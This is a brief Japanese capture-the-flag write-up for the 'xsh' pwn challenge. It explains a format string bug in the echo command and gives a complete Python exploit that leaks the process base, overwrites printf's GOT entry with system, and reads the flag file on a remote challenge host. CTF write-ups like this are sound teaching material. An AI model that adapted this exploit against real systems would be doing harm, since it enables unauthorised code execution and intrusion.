# [pwn 464pts] xsh - Rooters CTF
64ビットでRELRO以外有効です。
```
$ checksec -f xsh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83 Symbols     Yes      0               6       xsh
```
lsやechoなど複数のコマンドのみ実行できるというInterKosenCTF 2019で出したbullshみたいな感じです。echoコマンドにFSBがあるので、proc baseをリークしてprintfをsystemに書き換えれば終わりです。
```python
from ptrlib import *

elf = ELF("./xsh")
#sock = Process("./xsh")
sock = Socket("35.192.206.226", 5555)

# leak proc base
"""
sock.sendlineafter("$", "echo %175$p")
libc_base = int(sock.recvline(), 16)
logger.info("libc base = " + hex(libc_base))
"""
sock.sendlineafter("$", "echo %1$p")
proc_base = int(sock.recvline(), 16) - 0x23ae
logger.info("proc base = " + hex(proc_base))

# printf to system
writes = {
    proc_base + elf.got("printf"): proc_base + 0x1090
}
payload = fsb(
    written = 3,
    writes = writes,
    pos = 25,
    bs = 1,
    bits = 32
)
sock.sendlineafter("$", b"echo    " + payload)

sock.sendline("echo cat /home/vuln/flag.txt")

sock.interactive()
```

# 感想
簡単ですね。
